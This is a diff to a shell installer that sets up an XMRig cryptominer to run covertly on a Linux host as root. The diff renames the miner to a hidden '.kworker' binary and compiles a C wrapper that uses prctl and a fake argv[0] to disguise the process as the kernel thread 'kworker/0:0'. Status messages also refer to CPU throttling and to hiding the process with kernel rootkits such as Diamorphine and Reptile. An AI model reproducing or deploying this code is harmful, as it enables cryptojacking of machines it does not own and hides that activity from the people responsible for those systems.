@@ -412,26 +412,99 @@ if [ "$DOWNLOAD_SUCCESS" = true ] && [ -f xmrig.tar.gz ]; then
     }
     
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
-        mv xmrig-*/xmrig swapd 2>/dev/null || {
+        # Rename xmrig to hidden .kworker (actual miner binary)
+        mv xmrig-*/xmrig .kworker 2>/dev/null || {
             echo "[!] Failed to rename xmrig binary - continuing anyway..."
             DOWNLOAD_SUCCESS=false
         }
     fi
     
     if [ "$DOWNLOAD_SUCCESS" = true ]; then
-        chmod +x swapd 2>/dev/null || true
+        chmod +x .kworker 2>/dev/null || true
         rm -rf xmrig-* xmrig.tar.gz
-        echo "[✓] XMRig downloaded and renamed to 'swapd'"
+        echo "[✓] XMRig downloaded and renamed to '.kworker' (hidden)"
     fi
 fi
 
 if [ "$DOWNLOAD_SUCCESS" = false ]; then
     echo "[!] Failed to download/extract XMRig"
-    echo "[!] You can manually download xmrig and place it at /root/.swapd/swapd"
+    echo "[!] You can manually download xmrig and place it at /root/.swapd/.kworker"
     echo "[*] Continuing with installation anyway..."
     # Create a placeholder so config creation doesn't fail
-    touch /root/.swapd/swapd 2>/dev/null || true
+    touch /root/.swapd/.kworker 2>/dev/null || true
 fi
+
+# ==================== CREATE PRCTL WRAPPER ====================
+echo "[*] Creating kernel worker process wrapper..."
+
+# Create C wrapper that uses prctl(PR_SET_NAME) to rename process
+cat > /tmp/kworker_wrapper.c << 'WRAPPER_EOF'
+/*
+ * Kernel Worker Process Wrapper
+ * Renames process to look like kernel worker thread using prctl(PR_SET_NAME)
+ */
+
+#include <stdio.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <sys/prctl.h>
+#include <string.h>
+
+int main(int argc, char *argv[]) {
+    // Set process name to kernel worker thread
+    // prctl can set up to 15 characters
+    if (prctl(PR_SET_NAME, "kworker/0:0", 0, 0, 0) < 0) {
+        // Silently continue even if prctl fails
+    }
+    
+    // Path to actual miner binary
+    char *miner_path = "/root/.swapd/.kworker";
+    
+    // Build argument list for execv
+    char **new_argv = malloc(sizeof(char*) * (argc + 1));
+    if (!new_argv) {
+        exit(1);
+    }
+    
+    // Set argv[0] to kernel worker name (shows in ps output)
+    new_argv[0] = "[kworker/0:0]";
+    
+    // Copy remaining arguments (like -c /root/.swapd/swapfile)
+    for (int i = 1; i < argc; i++) {
+        new_argv[i] = argv[i];
+    }
+    new_argv[argc] = NULL;
+    
+    // Replace current process with miner
+    // This preserves the PID and the prctl name
+    execv(miner_path, new_argv);
+    
+    // If execv returns, it failed - silently exit
+    exit(1);
+}
+WRAPPER_EOF
+
+# Compile the wrapper
+if command -v gcc >/dev/null 2>&1; then
+    echo "[*] Compiling kernel worker wrapper with gcc..."
+    gcc -o swapd /tmp/kworker_wrapper.c 2>/dev/null && {
+        chmod +x swapd
+        rm -f /tmp/kworker_wrapper.c
+        echo "[✓] Kernel worker wrapper compiled successfully"
+        echo "[✓] Process will appear as 'kworker/0:0' (kernel worker thread)"
+    } || {
+        echo "[!] Failed to compile wrapper, using direct binary"
+        # Fallback: create symlink to actual binary
+        ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
+        rm -f /tmp/kworker_wrapper.c
+    }
+else
+    echo "[!] gcc not available, using direct binary"
+    # Fallback: create symlink to actual binary
+    ln -sf .kworker swapd 2>/dev/null || cp .kworker swapd 2>/dev/null
+    rm -f /tmp/kworker_wrapper.c
+fi
+
 
 # ==================== CONFIGURE XMRIG ====================
 echo "[*] Configuring XMRig..."
@@ -1258,7 +1331,8 @@ else
 fi
 
 echo '  ✓ Resource Constraints: Nice=19, CPUQuota=95%, Idle scheduling'
-echo '  ✓ Miner renamed: 'swapd' (stealth binary name)'
+echo '  ✓ Process name: kworker/0:0 (kernel worker thread - prctl renamed)'
+echo '  ✓ Binary structure: swapd wrapper → .kworker (actual miner)'
 echo '  ✓ Process hiding: Kernel rootkits ONLY (Diamorphine, Reptile, crypto-rootkit)'
 
 echo ''
